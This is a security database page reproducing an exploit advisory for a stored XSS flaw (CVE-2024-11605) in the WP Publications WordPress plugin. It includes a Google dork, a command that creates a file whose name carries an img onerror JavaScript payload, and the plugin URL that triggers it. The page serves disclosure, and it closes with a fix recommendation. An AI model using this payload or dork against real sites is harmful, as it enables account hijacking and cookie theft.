---
title: WordPress Plugin WP Publications < = 1.2 - Admin+ Stored XSS
url: https://cxsecurity.com/issue/WLB-2025090002
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-09-05
fetch_date: 2025-10-02T19:39:54.207178
---

# WordPress Plugin WP Publications < = 1.2 - Admin+ Stored XSS

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **WordPress Plugin WP Publications <= 1.2 - Admin+ Stored XSS** **2025.09.04**  Credit:  **[Zeynalxan Quliyev, Ravan Poladli](https://cxsecurity.com/author/Zeynalxan%2BQuliyev%2C%2BRavan%2BPoladli/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2024-11605](https://cxsecurity.com/cveshow/CVE-2024-11605/ "Click to see CVE-2024-11605")**  CWE: **N/A**  **[**Dork:** inurl:/wp-content/plugins/wp-publications/](https://cxsecurity.com/dorks/)** | |

# Exploit Title: WordPress Plugin WP Publications <= 1.2 - Admin+ Stored XSS
# Google Dork: inurl:/wp-content/plugins/wp-publications/
# Date: 2025-07-15
# Exploit Author: Zeynalxan Quliyev, Ravan Poladli
# Vendor Homepage: https://wordpress.org/plugins/wp-publications/
# Software Link: https://downloads.wordpress.org/plugin/wp-publications.1.2.zip
# Version: <= 1.2
# Tested on: WordPress 6.5.3 / Linux (Apache)
# CVE: CVE-2024-11605
## Vulnerability Details
The WP Publications plugin for WordPress (versions <= 1.2) is vulnerable to a \*\*Stored Cross-Site Scripting (XSS)\*\* attack. The vulnerability exists because the plugin fails to escape filenames before outputting them in the HTML, allowing high-privileged users (such as admins) to inject arbitrary JavaScript code.
This vulnerability is exploitable even in WordPress configurations where the `unfiltered\_html` capability is disabled (e.g., multisite setups).
---
## Proof of Concept (PoC)
1. SSH into the server and navigate to the plugin directory:
```bash
cd /var/www/html/wp-content/plugins/wp-publications/
```
2. Run the following command to create a malicious BibTeX file:
```bash
touch "<img src=x onerror=alert('XSS')>.bib"
```
3. Access the plugin's BibTeX browser via the following URL:
```
https://example.com/wp-content/plugins/wp-publications/bibtexbrowser.php?frameset&bib=
```
4. The injected JavaScript will be executed, triggering the XSS payload:
```javascript
alert('XSS');
```
---
## Impact
\* Stored XSS (JavaScript) is executed in the context of the admin panel.
\* Bypasses `unfiltered\_html` protection in multisite environments.
\* Can be used for privilege escalation, cookie theft, or injecting malicious content.
---
## Recommendation
Update to a version of the plugin that properly escapes file names before rendering them in the output. If no update is available, disable the plugin or sanitize file inputs manually.
---

**##### References:**

\* [CVE-2024-11605 on NVD](

https://nvd.nist.gov/vuln/detail/CVE-2024-11605

)
\* [WPScan](

https://wpscan.com/vulnerability/91c5ee70-2ff5-46cd-a0f5-54987fc2e060/

)

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025090002)

[Tweet](https://twitter.com/share)

Vote for this issue:
 1
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top